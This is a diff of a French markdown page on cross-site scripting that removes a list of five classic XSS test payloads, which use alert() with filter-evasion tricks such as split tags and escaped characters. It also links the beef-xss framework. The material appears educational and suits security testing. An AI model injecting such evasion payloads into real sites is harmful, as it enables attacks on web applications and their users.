@@ -172,15 +172,6 @@ Le cross-site scripting (également connu sous le nom de XSS) est une vulnérabi
 
 <br/>
 
-**Payloads classiques**
-* '<scr<script>ipt>alert('XSS')</scr<script>ipt>'
-* "><script>alert('XSS')</script>
-* "><script>alert(String.fromCharCode(88,83,83))</script>
-* <script>\u0061lert('22')</script>
-* <script>eval('\x61lert(\'33\')')</script>
-
-<br/>
-
 **Outils:**
 * [beef-xss](https://github.com/beefproject/beef)
 * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
